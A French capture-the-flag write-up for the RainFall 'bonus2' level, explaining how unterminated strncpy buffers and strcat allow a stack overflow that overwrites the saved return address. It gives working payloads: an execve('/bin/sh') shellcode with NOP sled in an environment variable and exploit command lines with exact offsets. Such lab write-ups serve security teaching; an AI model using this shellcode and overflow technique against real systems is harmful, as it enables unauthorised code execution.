## Bonus2

### **Déroulement du programme :** ###

- Une variable globale est initialisé à 0 (disons `g_lang`)

###### main()

- 2 buffers sont déclarés (disons `buff_1` et `buff_2`)
- Un pointeur sur `char` est déclaré (disons `lang`)
- Si `argc` est égal à 3
    - on copie 40 caractères de `argv[1]` dans `buff_1` avec `strncpy`
    - on copie 32 caractères de `argv[2]` dans `buff_2` avec `strncpy`
    - on stocke la valeur de la **variable d'environnement** `LANG` dans `lang`
    - si `lang` n'est pas `NULL`
        - si `lang` est égale à **"fi"**
            - on assigne 1 à `g_lang`
        - si `lang` est égale à **"nl"**
            - on assigne 2 à `g_lang`
    - on appel la fonction `greetuser` avec `buff_1` comme paramètre

###### greetuser()

- un pointeur sur `char` est déclaré (disons `str`)
- si `g_lang` vaut 1
    - on copie **"Hyvää päivää "** dans `str`
- si `g_lang` vaut 2
    - on copie **"Goedemiddag! "** dans `str`
- si `g_lang` vaut 0
    - on copie **"Hello "** dans `str`
- `buff_1` est concaténé à `str`
- `str` est imprimé sur la sortie standard


### **Objectif :** ###

On va chercher à utiliser une technique semblable à celle utilisée pour le **bonus0**. 

En effet on va se servir de `strncpy` pour que `buff_1` et `buff_2` ne forment plus qu'une chaîne (les deux buffers sont à la suite sur la **stack** et `strncpy` ne met pas de **'\0'** si le nombre de caractères copiés est supérieur ou égal à la taille du buffer de destination) au moment où `buff_1` est passé en paramètre à `greetuser`.

On va par la suite chercher à surcharger la sauvegarde de **EIP** présente dans la **stackframe** de `greetuser` par l'adresse d'une **variable d'environnement** contenant un **shell code**. 

Cela se fera au moment de la concaténation de `buff_1 + buff_2` à `str`.


### **Tests :** ###

Le comportement du programme varie en fonction de la valeur présente dans la variable d'environnement `LANG`.

Ainsi par défaut on obtient :

```
bonus2@RainFall:~$ ./bonus2 42 42
Hello 42
```

Quand on set `LANG` à **"fi"** (pour finnois) :

```
bonus2@RainFall:~$ ./bonus2 42 42
Hyvää päivää 42
```

Quand on set `LANG`  à **"nl"** (pour néerlandais) :

```
bonus2@RainFall:~$ ./bonus2 42 42
Goedemiddag! 42
```

Si on essaye d'overflow dans la situation de base on voit qu'on ne va juste pas assez loin pour écraser la sauvegarde de l'**EIP** :

```
Starting program: /home/user/bonus2/bonus2 $(python -c 'print("A"*100)') $(python -c 'print("B"*100)')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
```

On voit ici qu'il ne nous manque que 2 octets pour que ça fonctionne, les chaînes **""Hyvää päivää ""** et **"Goedemiddag! "** étant plus longue que **"Hello "** nous allons pouvoir faire notre surcharge.

On trouve un offset de 18 avec `LANG` égale à **"fi"**, 23 en utilisant **"nl"**. 


### **Solution :** ###

On crée notre **shell code** :

```
export SHELL_CODE=$(python -c 'print "\x90"*30+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

On trouve son adresse à l'aide de :

```
x/20s *((char **) environ)
```

#### Cas 1 :

```
export LANG="fi"
```

```
./bonus2 $(python -c 'print("A"*100)') $(python -c 'print("B"*18 + "\x0c\xff\xff\xbf")')
```

#### Cas 2 :

```
export LANG="nl"
```

```
./bonus2 $(python -c 'print("A"*100)') $(python -c 'print("B"*23 + "\x0c\xff\xff\xbf")')
```